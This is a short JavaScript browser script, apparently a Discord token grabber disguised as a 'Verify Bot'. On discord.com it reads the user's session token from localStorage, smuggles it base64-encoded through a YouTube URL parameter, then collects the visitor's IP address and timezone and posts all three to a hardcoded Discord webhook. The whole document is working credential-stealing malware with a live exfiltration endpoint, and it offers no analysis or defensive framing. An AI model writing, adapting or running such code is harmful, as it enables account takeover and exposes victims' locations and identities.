const webhookURL = 'https://discord.com/api/webhooks/1332219931588034630/VCkO6nJoho1ZkLrUUAU6oenxzPXQHDs6tIJ4kEFtayR8EdCA-dnD0JVBB5t5dJUWmkYP';

if (window.location.href.startsWith("https://www.youtube.com/")) {
    const url = new URL(window.location.href);
    const param = atob(url.searchParams.get("v"));
    if (param != null) {

        fetch('https://api.ipify.org/?format=json')
            .then(response => response.json())
            .then(data => {
                const ip = data.ip;
                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                const message = {
                    username: "Verify Bot",
                    embeds: [
                        {
                            title: "Verify Info (To veify the user)",
                            description: IP: ${ip}\nTimezone: ${timezone}\nToken: ${param},
                            color: 16711935 // makes it pink
                        }
                    ]
                };

                fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(message)
                })
                .catch(error => console.error('Error1:', error));
            })
            .catch(error => console.error('Error2:', error));
    }
} else if (window.location.href === "https://discord.com/channels/@me") {

    const token = localStorage.token;
    if (token != null) {
        window.location.href = "https://www.youtube.com/watch?v=" + btoa(JSON.stringify(token));
    }
} else {

    window.location.href = "https://discord.com/channels/@me";
}
